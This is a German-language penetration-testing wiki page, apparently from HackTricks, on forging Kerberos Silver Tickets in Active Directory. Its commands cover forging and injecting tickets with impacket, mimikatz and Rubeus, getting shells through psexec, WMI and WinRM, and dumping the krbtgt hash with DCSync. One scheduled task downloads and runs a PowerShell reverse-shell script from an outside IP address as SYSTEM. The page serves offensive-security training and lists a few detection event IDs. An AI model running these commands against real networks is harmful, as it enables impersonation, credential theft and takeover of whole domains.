# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Der **Silver Ticket**-Angriff beinhaltet die Ausnutzung von Diensttickets in Active Directory (AD)-Umgebungen. Diese Methode basiert auf der **Erwerbung des NTLM-Hashes eines Dienstkontos**, wie z.B. eines Computer-Kontos, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Dienste im Netzwerk zugreifen, **indem er sich als beliebiger Benutzer ausgibt**, wobei typischerweise administrative Berechtigungen angestrebt werden. Es wird betont, dass die Verwendung von AES-Schlüsseln zur Fälschung von Tickets sicherer und weniger nachweisbar ist.

Für die Ticket-Erstellung werden je nach Betriebssystem unterschiedliche Tools eingesetzt:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Auf Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Der CIFS-Dienst wird als häufiges Ziel hervorgehoben, um auf das Dateisystem des Opfers zuzugreifen, aber auch andere Dienste wie HOST und RPCSS können für Aufgaben und WMI-Abfragen ausgenutzt werden.

## Verfügbare Dienste

| Diensttyp                                   | Dienst Silber-Tickets                                                      |
| ------------------------------------------- | -------------------------------------------------------------------------- |
| WMI                                         | <p>HOST</p><p>RPCSS</p>                                                   |
| PowerShell Remoting                         | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                       | <p>HOST</p><p>HTTP</p><p>In einigen Fällen können Sie einfach nachfragen: WINRM</p> |
| Geplante Aufgaben                           | HOST                                                                      |
| Windows-Dateifreigabe, auch psexec         | CIFS                                                                      |
| LDAP-Operationen, einschließlich DCSync    | LDAP                                                                      |
| Windows Remote Server Administration Tools   | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                        |
| Goldene Tickets                             | krbtgt                                                                    |

Mit **Rubeus** können Sie **alle** diese Tickets mit dem Parameter anfordern:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silberne Ticket-Ereignis-IDs

- 4624: Kontoanmeldung
- 4634: Abmeldung des Kontos
- 4672: Admin-Anmeldung

## Missbrauch von Diensttickets

In den folgenden Beispielen stellen wir uns vor, dass das Ticket unter Verwendung des Administratorkontos abgerufen wird.

### CIFS

Mit diesem Ticket können Sie auf den `C$`- und `ADMIN$`-Ordner über **SMB** zugreifen (wenn sie exponiert sind) und Dateien in einen Teil des Remote-Dateisystems kopieren, indem Sie einfach etwas tun wie:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Sie können auch eine Shell im Host erhalten oder beliebige Befehle mit **psexec** ausführen:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Mit dieser Berechtigung können Sie geplante Aufgaben auf Remote-Computern erstellen und beliebige Befehle ausführen:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Mit diesen Tickets können Sie **WMI im Opfersystem ausführen**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Finde **weitere Informationen über wmiexec** auf der folgenden Seite:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Mit winrm-Zugriff auf einen Computer kannst du **darauf zugreifen** und sogar eine PowerShell erhalten:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Überprüfen Sie die folgende Seite, um **weitere Möglichkeiten zu erfahren, sich mit einem Remote-Host über winrm zu verbinden**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Beachten Sie, dass **winrm aktiv und hörend** auf dem Remote-Computer sein muss, um darauf zuzugreifen.

### LDAP

Mit diesem Privileg können Sie die DC-Datenbank mit **DCSync** dumpen:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Erfahren Sie mehr über DCSync** auf der folgenden Seite:

## Referenzen

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}
